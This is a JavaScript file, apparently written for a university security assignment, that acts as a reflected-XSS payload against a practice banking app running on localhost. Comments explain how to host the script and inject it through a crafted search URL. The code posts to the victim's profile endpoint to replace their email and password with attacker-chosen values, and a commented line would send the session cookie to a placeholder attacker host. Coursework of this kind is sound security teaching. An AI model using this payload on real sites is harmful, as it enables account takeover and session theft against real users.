// FIT5003 Assignment 2 — Part B.2 reflected-XSS external payload.
//
// Host this file on GitHub Pages, or serve it through jsDelivr from your own
// repo so it comes back with a JavaScript content type (a raw
// raw.githubusercontent.com URL is served as text/plain + nosniff and will
// NOT execute as a <script src="...">):
//
//     https://cdn.jsdelivr.net/gh/<your-github-user>/<repo>@<branch>/payload.js
//
// Injected into DevBank's reflected sink (templates/search.html:9, `{{ q | safe }}`)
// via a crafted URL such as:
//
//     http://127.0.0.1:5000/search?q=<script%20src="https://cdn.jsdelivr.net/gh/<user>/<repo>@<branch>/payload.js"></script>
//
// Because the <script> tag is reflected back and executed in the DevBank
// origin, this code runs as if it were DevBank's own JS — so a same-origin
// fetch() automatically carries the logged-in victim's `auth` session cookie
// (credentials: "include" makes that explicit). It POSTs to /profile
// (app.py profile()) to overwrite the victim's email and password, which is
// the "account takeover" impact the task requires.
//
// IMPORTANT: change the body below to something you can clearly show changed
// in your report/video (e.g. a distinctive email you control).

(function () {
    fetch("/profile", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
            email: "attacker-controlled@evil.example",
            password: "hacked12345",
        }),
    });
    // Optional: also beacon proof back to an attacker-controlled endpoint,
    // e.g. a request-bin or your own tiny HTTP server, if you want evidence
    // beyond "I could log in with the new password" for the report:
    //
    // fetch("https://<your-attacker-host>/pwned?cookie=" + encodeURIComponent(document.cookie));
})();
